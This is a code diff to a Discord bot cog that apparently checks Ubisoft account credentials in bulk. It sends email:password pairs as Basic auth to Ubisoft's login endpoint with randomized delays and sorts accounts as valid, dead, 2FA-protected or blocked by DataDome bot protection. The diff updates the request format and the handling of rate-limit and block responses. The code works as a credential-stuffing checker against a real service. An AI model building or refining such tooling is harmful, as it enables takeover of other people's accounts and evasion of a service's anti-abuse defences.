@@ -57,7 +57,7 @@ class Checker(commands.Cog):
         await asyncio.sleep(random.uniform(1.0, 2.0))
 
         headers = {
-            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Type": "application/json",
             "Ubi-AppId": UBI_APP_ID,
             "Authorization": f"Basic {b64_auth}",
             "Accept": "application/json",
@@ -80,7 +80,7 @@ class Checker(commands.Cog):
                 return session.post(
                     "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                     headers=headers,
-                    data="rememberMe=true",
+                    data=json.dumps({"rememberMe": True}),
                     timeout_seconds=15
                 )
 
@@ -94,10 +94,10 @@ class Checker(commands.Cog):
                 embed.color = 0xED4245
                 embed.add_field(name="Status", value="❌ Invalid / 2FA")
                 await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
-            elif response.status_code == 403:
+            elif response.status_code in (403, 429):
                 embed.color = 0xED4245
                 embed.add_field(name="Status", value="🚫 DataDome Blocked")
-                await interaction.followup.send("🚫 **403 Blocked:** DataDome blocked this IP.", ephemeral=True)
+                await interaction.followup.send("🚫 **Blocked:** DataDome blocked this IP.", ephemeral=True)
             else:
                 embed.color = 0xFEE75C
                 embed.add_field(name="Status", value=f"⚠️ Error {response.status_code}")
@@ -200,7 +200,7 @@ class Checker(commands.Cog):
                 b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
                 
                 headers = {
-                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Type": "application/json",
                     "Ubi-AppId": UBI_APP_ID,
                     "Authorization": f"Basic {b64_auth}",
                     "Accept": "application/json",
@@ -219,7 +219,7 @@ class Checker(commands.Cog):
                     return session.post(
                         "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                         headers=headers,
-                        data="rememberMe=true",
+                        data=json.dumps({"rememberMe": True}),
                         timeout_seconds=15
                     )
 
@@ -229,7 +229,7 @@ class Checker(commands.Cog):
                         valid_accounts.append(acc)
                     elif response.status_code == 401:
                         pass
-                    elif response.status_code == 403:
+                    elif response.status_code in (403, 429):
                         valid_accounts.append(acc)
                 except Exception:
                     valid_accounts.append(acc)
